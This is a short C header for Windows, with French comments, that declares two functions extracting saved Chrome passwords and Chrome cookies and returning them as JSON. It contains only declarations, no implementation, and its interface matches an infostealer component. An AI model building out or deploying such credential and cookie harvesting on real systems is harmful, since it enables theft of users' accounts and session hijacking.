#ifndef BROWSER_H
#define BROWSER_H

#include <windows.h>

/*
 * Extrait les passwords Chrome.
 * Retourne un JSON avec les credentials.
 * L'appelant doit libérer le résultat.
 */
BOOL Browser_GetChromePasswords(char** outJson);

/*
 * Extrait les cookies Chrome.
 */
BOOL Browser_GetChromeCookies(char** outJson);

#endif // BROWSER_H
